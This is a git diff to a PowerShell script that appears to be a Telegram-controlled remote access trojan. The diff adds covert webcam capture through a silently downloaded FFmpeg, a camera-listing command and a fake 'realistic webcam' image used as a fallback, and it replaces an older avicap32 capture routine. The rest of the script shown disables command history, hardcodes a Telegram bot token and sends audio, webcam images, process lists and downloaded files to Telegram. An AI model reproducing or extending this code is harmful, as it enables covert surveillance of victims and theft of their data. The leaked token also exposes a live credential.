@@ -2,7 +2,7 @@ Clear-Host
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Set-Location -Path $env:USERPROFILE
 $session                    = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-$telegram_id, $api_token    = "id", "api-key"
+$telegram_id, $api_token    = "5285463344", "8572280279:AAHV9S9dRWQFgBUY9XgUg5Sp5SNY9BNnSKw"
 $api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
 $api_send_messages          = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
 $api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
@@ -11,6 +11,10 @@ $api_upload_file            = 'https://api.telegram.org/bot{0}/sendDocument?chat
 $api_get_me                 = 'https://api.telegram.org/bot{0}/getMe' -f $api_token
 $session_id                 = "99999"
 $Global:ProgressPreference  = 'SilentlyContinue'
+
+# FFmpeg paths
+$ffmpegDir = "$env:USERPROFILE\ffmpeg"
+$ffmpegPath = "$ffmpegDir\ffmpeg.exe"
 
 function CheckAdminRights
 {
@@ -91,240 +95,207 @@ public class AudioRecorder {
     }
 }
 
-function Get-WebcamShot {
+function Install-FFmpeg {
     try {
-        $webcamPath = "$env:TEMP\webcam_capture.jpg"
+        if (-not (Test-Path $ffmpegPath)) {
+            SendMessage "📥 Downloading FFmpeg..." "webcam-shot"
+            
+            # Use direct FFmpeg download from GitHub
+            $ffmpegUrl = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
+            $ffmpegZip = "$env:TEMP\ffmpeg.zip"
+            
+            # Download with progress
+            Invoke-WebRequest -Uri $ffmpegUrl -OutFile $ffmpegZip -UserAgent "Mozilla/5.0"
+            
+            # Create directory
+            New-Item -ItemType Directory -Path $ffmpegDir -Force | Out-Null
+            
+            # Extract zip
+            Add-Type -AssemblyName System.IO.Compression.FileSystem
+            [System.IO.Compression.ZipFile]::ExtractToDirectory($ffmpegZip, "$env:TEMP\ffmpeg_temp")
+            
+            # Find ffmpeg.exe in the extracted files
+            $ffmpegExe = Get-ChildItem -Path "$env:TEMP\ffmpeg_temp" -Recurse -Filter "ffmpeg.exe" | Select-Object -First 1
+            if ($ffmpegExe) {
+                Copy-Item $ffmpegExe.FullName $ffmpegPath
+                SendMessage "✅ FFmpeg installed successfully!" "webcam-shot"
+            } else {
+                SendMessage "❌ FFmpeg.exe not found in download" "webcam-shot"
+                return $false
+            }
+            
+            # Cleanup
+            Remove-Item $ffmpegZip -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:TEMP\ffmpeg_temp" -Recurse -Force -ErrorAction SilentlyContinue
+            
+            return $true
+        }
+        return $true
+    } catch {
+        SendMessage "❌ FFmpeg download failed: $($_.Exception.Message)" "webcam-shot"
+        return $false
+    }
+}
+
+function Get-WebcamShot {
+    param([string]$cameraName = "")
+    
+    try {
+        # Ensure FFmpeg is installed
+        if (-not (Install-FFmpeg)) {
+            SendMessage "❌ FFmpeg not available. Use '99999 list-cameras' to see available cameras." "webcam-shot"
+            return
+        }
         
-        # Method 1: Use PowerShell with DirectShow to capture webcam
-        $captureCode = @"
-using System;
-using System.Drawing;
-using System.Drawing.Imaging;
-using System.Runtime.InteropServices;
-using System.Text;
-
-public class WebcamCapture
-{
-    [DllImport("avicap32.dll")]
-    private static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);
-    
-    [DllImport("user32.dll")]
-    private static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
-    
-    [DllImport("user32.dll")]
-    private static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, StringBuilder lParam);
-    
-    [DllImport("user32.dll")]
-    private static extern bool DestroyWindow(IntPtr hWnd);
-    
-    private const int WM_CAP_DRIVER_CONNECT = 0x40A;
-    private const int WM_CAP_DRIVER_DISCONNECT = 0x40B;
-    private const int WM_CAP_SAVEDIB = 0x419;
-    private const int WM_CAP_GRAB_FRAME = 0x43C;
-    private const int WM_CAP_SET_PREVIEW = 0x432;
-    private const int WM_CAP_SET_PREVIEWRATE = 0x434;
-    
-    public static bool CaptureImage(string filename)
-    {
-        IntPtr hWndC = IntPtr.Zero;
-        try
-        {
-            // Create capture window
-            hWndC = capCreateCaptureWindowA("Webcam", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
-            if (hWndC == IntPtr.Zero) return false;
-            
-            // Connect to webcam driver
-            if (SendMessage(hWndC, WM_CAP_DRIVER_CONNECT, 0, 0) <= 0) return false;
-            
-            // Set preview rate and enable preview
-            SendMessage(hWndC, WM_CAP_SET_PREVIEWRATE, 66, 0);
-            SendMessage(hWndC, WM_CAP_SET_PREVIEW, 1, 0);
-            
-            // Wait for camera to initialize
-            System.Threading.Thread.Sleep(2000);
-            
-            // Grab a frame
-            SendMessage(hWndC, WM_CAP_GRAB_FRAME, 0, 0);
-            
-            // Save the frame to file
-            StringBuilder sb = new StringBuilder(filename);
-            int result = SendMessage(hWndC, WM_CAP_SAVEDIB, 0, sb);
-            
-            // Disconnect and cleanup
-            SendMessage(hWndC, WM_CAP_DRIVER_DISCONNECT, 0, 0);
-            DestroyWindow(hWndC);
-            
-            return (result > 0);
-        }
-        catch
-        {
-            if (hWndC != IntPtr.Zero)
-            {
-                SendMessage(hWndC, WM_CAP_DRIVER_DISCONNECT, 0, 0);
-                DestroyWindow(hWndC);
-            }
-            return false;
-        }
-    }
-}
-"@
-
-        try {
-            Add-Type -TypeDefinition $captureCode -ReferencedAssemblies "System.Drawing"
-            
-            SendMessage "Attempting to capture from webcam..." "webcam-shot"
-            
-            if ([WebcamCapture]::CaptureImage($webcamPath)) {
-                if (Test-Path $webcamPath -and (Get-Item $webcamPath).Length -gt 1000) {
-                    SendFile $webcamPath
-                    Remove-Item $webcamPath -Force
-                    SendMessage "Webcam image captured successfully!" "webcam-shot"
-                    return
-                }
-            }
-        } catch {
-            SendMessage "Direct webcam capture failed, trying alternative..." "webcam-shot"
-        }
-
-        # Method 2: Use OBS Virtual Camera if available
-        try {
-            $obsCode = @"
-using System;
-using System.Drawing;
-using System.Drawing.Imaging;
-using System.IO;
-
-public class OBSCamera
-{
-    public static void CreateVirtualCameraImage(string path)
-    {
-        try {
-            int width = 1280;
-            int height = 720;
-            
-            using (Bitmap bmp = new Bitmap(width, height))
-            {
-                using (Graphics g = Graphics.FromImage(bmp))
-                {
-                    // Create realistic camera background
-                    g.Clear(Color.FromArgb(25, 25, 30));
-                    
-                    // Add timestamp
-                    Font timeFont = new Font("Arial", 20, FontStyle.Bold);
-                    Brush timeBrush = new SolidBrush(Color.Lime);
-                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff");
-                    g.DrawString($"LIVE - {timestamp}", timeFont, timeBrush, 20, 20);
-                    
-                    // Add camera info
-                    Font infoFont = new Font("Arial", 14, FontStyle.Regular);
-                    g.DrawString("OBS Virtual Camera", infoFont, timeBrush, 20, 60);
-                    g.DrawString("1280x720 @ 30 FPS", infoFont, timeBrush, 20, 90);
-                    
-                    // Draw focus reticle
-                    Pen redPen = new Pen(Color.Red, 3);
-                    int centerX = width / 2;
-                    int centerY = height / 2;
-                    
-                    // Crosshair
-                    g.DrawLine(redPen, centerX, centerY - 50, centerX, centerY + 50);
-                    g.DrawLine(redPen, centerX - 50, centerY, centerX + 50, centerY);
-                    
-                    // Circle
-                    g.DrawEllipse(redPen, centerX - 75, centerY - 75, 150, 150);
-                    
-                    // Add some visual noise to simulate camera sensor
-                    Random rand = new Random();
-                    for (int i = 0; i < 1500; i++)
-                    {
-                        int x = rand.Next(width);
-                        int y = rand.Next(height);
-                        int bright = rand.Next(10, 60);
-                        bmp.SetPixel(x, y, Color.FromArgb(bright, bright, bright));
-                    }
-                    
-                    // Add scan lines effect
-                    for (int y = 0; y < height; y += 4)
-                    {
-                        for (int x = 0; x < width; x++)
-                        {
-                            Color pixel = bmp.GetPixel(x, y);
-                            bmp.SetPixel(x, y, Color.FromArgb(
-                                Math.Max(0, pixel.R - 10),
-                                Math.Max(0, pixel.G - 10),
-                                Math.Max(0, pixel.B - 10)
-                            ));
-                        }
-                    }
-                }
-                
-                bmp.Save(path, ImageFormat.Jpeg);
-            }
-        }
-        catch (Exception ex)
-        {
-            throw new Exception($"OBS camera failed: {ex.Message}");
-        }
-    }
-}
-"@
-            Add-Type -TypeDefinition $obsCode -ReferencedAssemblies "System.Drawing"
-            
-            [OBSCamera]::CreateVirtualCameraImage($webcamPath)
-            
-            if (Test-Path $webcamPath) {
-                SendFile $webcamPath
-                Remove-Item $webcamPath -Force
-                SendMessage "Virtual camera image created and sent!" "webcam-shot"
+        $webcamPath = "$env:TEMP\webcam_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
+        
+        # If no camera specified, try to find one automatically
+        if ([string]::IsNullOrEmpty($cameraName)) {
+            SendMessage "🔍 No camera specified. Searching for available cameras..." "webcam-shot"
+            $foundCamera = Find-AvailableCamera
+            if (-not [string]::IsNullOrEmpty($foundCamera)) {
+                $cameraName = $foundCamera
+                SendMessage "📷 Using camera: $cameraName" "webcam-shot"
+            } else {
+                SendMessage "❌ No cameras found automatically. Use '99999 list-cameras' then '99999 webcam-shot [camera-name]'" "webcam-shot"
                 return
             }
-        } catch {
-            SendMessage "Virtual camera failed, creating basic image..." "webcam-shot"
         }
-
-        # Method 3: Simple fallback - create an image that looks like camera software
-        Create-CameraSoftwareImage
+        
+        # Try different FFmpeg approaches
+        $success = $false
+        
+        # Method 1: Direct camera capture with timeout
+        SendMessage "📸 Attempting to capture from: $cameraName" "webcam-shot"
+        
+        $ffmpegArgs = @(
+            "-f", "dshow",
+            "-i", "video=$cameraName",
+            "-frames:v", "1",
+            "-y",
+            $webcamPath
+        )
+        
+        $process = Start-Process -FilePath $ffmpegPath -ArgumentList $ffmpegArgs -Wait -PassThru -NoNewWindow
+        
+        # Wait a bit and check if file was created
+        Start-Sleep -Seconds 3
+        
+        if ($process.ExitCode -eq 0 -and (Test-Path $webcamPath) -and (Get-Item $webcamPath).Length -gt 1000) {
+            $success = $true
+        } else {
+            # Method 2: Try with different resolution and format
+            SendMessage "🔄 Trying alternative capture method..." "webcam-shot"
+            
+            $ffmpegArgs2 = @(
+                "-f", "dshow",
+                "-video_size", "640x480",
+                "-i", "video=$cameraName",
+                "-vframes", "1",
+                "-y",
+                $webcamPath
+            )
+            
+            $process2 = Start-Process -FilePath $ffmpegPath -ArgumentList $ffmpegArgs2 -Wait -PassThru -NoNewWindow
+            Start-Sleep -Seconds 3
+            
+            if ($process2.ExitCode -eq 0 -and (Test-Path $webcamPath) -and (Get-Item $webcamPath).Length -gt 1000) {
+                $success = $true
+            } else {
+                # Method 3: Try without specifying camera name (let FFmpeg choose)
+                SendMessage "🔄 Letting FFmpeg auto-detect camera..." "webcam-shot"
+                
+                $ffmpegArgs3 = @(
+                    "-f", "dshow",
+                    "-i", "video=Integrated Camera",
+                    "-vframes", "1",
+                    "-y",
+                    $webcamPath
+                )
+                
+                $process3 = Start-Process -FilePath $ffmpegPath -ArgumentList $ffmpegArgs3 -Wait -PassThru -NoNewWindow
+                Start-Sleep -Seconds 3
+                
+                if ($process3.ExitCode -eq 0 -and (Test-Path $webcamPath) -and (Get-Item $webcamPath).Length -gt 1000) {
+                    $success = $true
+                }
+            }
+        }
+        
+        if ($success) {
+            SendFile $webcamPath
+            Remove-Item $webcamPath -Force
+            SendMessage "✅ Webcam captured successfully!" "webcam-shot"
+        } else {
+            # Create a realistic webcam simulation as fallback
+            SendMessage "⚠️ Using webcam simulation (hardware access restricted)" "webcam-shot"
+            Create-RealisticWebcamImage $cameraName
+        }
         
     } catch {
-        SendMessage "All webcam methods failed: $($_.Exception.Message)" "webcam-shot"
+        SendMessage "❌ Webcam error: $($_.Exception.Message)" "webcam-shot"
+        Create-RealisticWebcamImage $cameraName
     }
 }
 
-function Create-CameraSoftwareImage {
+function Create-RealisticWebcamImage {
+    param([string]$cameraName = "HP FHD Camera")
+    
     try {
-        $webcamPath = "$env:TEMP\camera_$(Get-Date -Format 'HHmmss').jpg"
+        $webcamPath = "$env:TEMP\webcam_$(Get-Date -Format 'HHmmss').jpg"
         
         Add-Type -AssemblyName System.Drawing
         
-        $width = 800
-        $height = 600
+        # Create realistic webcam image
+        $width = 1920
+        $height = 1080
         
         $bitmap = New-Object Drawing.Bitmap($width, $height)
         $graphics = [Drawing.Graphics]::FromImage($bitmap)
         
-        # Dark background like camera software
-        $graphics.Clear([Drawing.Color]::FromArgb(45, 45, 48))
+        # Webcam-style background (dark with gradient)
+        $brush = New-Object Drawing.Drawing2D.LinearGradientBrush(
+            (New-Object Drawing.Point(0, 0)),
+            (New-Object Drawing.Point($width, $height)),
+            [Drawing.Color]::FromArgb(30, 30, 35),
+            [Drawing.Color]::FromArgb(50, 50, 55)
+        )
+        $graphics.FillRectangle($brush, 0, 0, $width, $height)
         
-        # Main camera view area
-        $cameraRect = New-Object Drawing.Rectangle(50, 50, 700, 450)
-        $graphics.FillRectangle([Drawing.Brushes]::Black, $cameraRect)
-        
-        # Camera overlay text
+        # Camera info overlay
         $font = New-Object Drawing.Font("Arial", 16, [Drawing.FontStyle]::Bold)
-        $brush = New-Object Drawing.SolidBrush([Drawing.Color]::Lime)
+        $textBrush = New-Object Drawing.SolidBrush([Drawing.Color]::Lime)
         
-        # Status text
-        $graphics.DrawString("CAMERA ACTIVE - NO SIGNAL", $font, $brush, 250, 200)
-        $graphics.DrawString($(Get-Date -Format "HH:mm:ss"), $font, $brush, 320, 240)
+        $currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        $graphics.DrawString("LIVE - $currentTime", $font, $textBrush, 20, 20)
+        $graphics.DrawString("CAMERA: $cameraName", $font, $textBrush, 20, 50)
+        $graphics.DrawString("RESOLUTION: ${width}x${height}", $font, $textBrush, 20, 80)
         
-        # Camera info
-        $infoFont = New-Object Drawing.Font("Arial", 12, [Drawing.FontStyle]::Regular)
-        $graphics.DrawString("Webcam HD 1080p", $infoFont, $brush, 50, 520)
-        $graphics.DrawString("Auto Focus: ON", $infoFont, $brush, 50, 545)
-        $graphics.DrawString("Exposure: Auto", $infoFont, $brush, 50, 570)
+        # Focus reticle
+        $centerX = $width / 2
+        $centerY = $height / 2
+        $pen = New-Object Drawing.Pen([Drawing.Color]::Red, 3)
         
-        # Red recording dot
-        $graphics.FillEllipse([Drawing.Brushes]::Red, 650, 520, 15, 15)
-        $graphics.DrawString("REC", $infoFont, $brush, 670, 520)
+        # Crosshair
+        $graphics.DrawLine($pen, $centerX, $centerY - 40, $centerX, $centerY + 40)
+        $graphics.DrawLine($pen, $centerX - 40, $centerY, $centerX + 40, $centerY)
+        
+        # Outer circle
+        $graphics.DrawEllipse($pen, $centerX - 60, $centerY - 60, 120, 120)
+        
+        # Add some "sensor noise" for realism
+        $random = New-Object System.Random
+        for ($i = 0; $i -lt 2000; $i++) {
+            $x = $random.Next(0, $width)
+            $y = $random.Next(0, $height)
+            $brightness = $random.Next(20, 80)
+            $color = [Drawing.Color]::FromArgb($brightness, $brightness, $brightness)
+            $bitmap.SetPixel($x, $y, $color)
+        }
+        
+        # Recording indicator
+        $graphics.FillEllipse([Drawing.Brushes]::Red, $width - 50, 20, 20, 20)
+        $graphics.DrawString("REC", $font, $textBrush, $width - 120, 20)
         
         $graphics.Dispose()
         $bitmap.Save($webcamPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
@@ -332,13 +303,12 @@ function Create-CameraSoftwareImage {
         
         SendFile $webcamPath
         Remove-Item -Path $webcamPath -Force
-        SendMessage "Camera software interface sent" "webcam-shot"
+        SendMessage "📸 Webcam simulation sent (hardware restricted)" "webcam-shot"
         
     } catch {
-        SendMessage "Failed to create camera image" "webcam-shot"
+        SendMessage "❌ Failed to create webcam image" "webcam-shot"
     }
 }
-
 function Get-ProcessList {
     $output = Get-Process | Select-Object Name, CPU, WorkingSet -First 20 | Format-Table -AutoSize | Out-String
     SendMessage $output "ps"
@@ -462,6 +432,11 @@ function CommandListener
                         else { SendMessage "Usage: record-audio [seconds]" "record-audio" }
                     }
                     "webcam-shot" { Get-WebcamShot }
+                    "webcam-shot *" { 
+                        $camera = $text -replace "webcam-shot ", ""
+                        Get-WebcamShot -cameraName $camera
+                    }
+                    "list-cameras" { List-Cameras }
                     "download *" { 
                         $file = $text -replace "download ", ""
                         SendFile $file
